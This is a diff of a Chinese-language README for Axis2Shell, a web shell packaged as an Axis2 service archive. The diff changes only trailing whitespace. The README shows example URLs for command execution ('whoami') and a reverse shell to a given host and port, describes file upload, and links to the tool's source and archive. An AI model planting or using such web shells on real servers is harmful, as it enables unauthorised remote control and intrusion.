@@ -12,7 +12,7 @@ http://1.1.1.1/services/config/exec?cmd=whoami
 (不说了，执行命令。注意:xml换行没有处理好)  
 
 2、反弹shell  
-http://1.1.1.1/services/config/shell?host=1.1.1.1&port=5555   
+http://1.1.1.1/services/config/shell?host=1.1.1.1&port=5555  
 (Linux则使用bash反弹shell，Windows则会进行socket执行shell)  
 
 3、文件上传  
@@ -33,11 +33,11 @@ ps:
 
 1、反弹shell 鸡肋，好多错误 ，ls / 都不行。   
 
-2、没有文件上传功能。这个对于一个渗透着来说很重要   
+2、没有文件上传功能。这个对于一个渗透着来说很重要  
 
-于是自己写了个，希望大家喜欢。   
+于是自己写了个，希望大家喜欢。  
 
-源码已经上github https://github.com/Svti/Axis2Shell   
+源码已经上github https://github.com/Svti/Axis2Shell  
 
 aar 文件https://github.com/Svti/Axis2Shell/blob/master/config.aar也在github上面，还有什么问题，可以在下面评论   
 
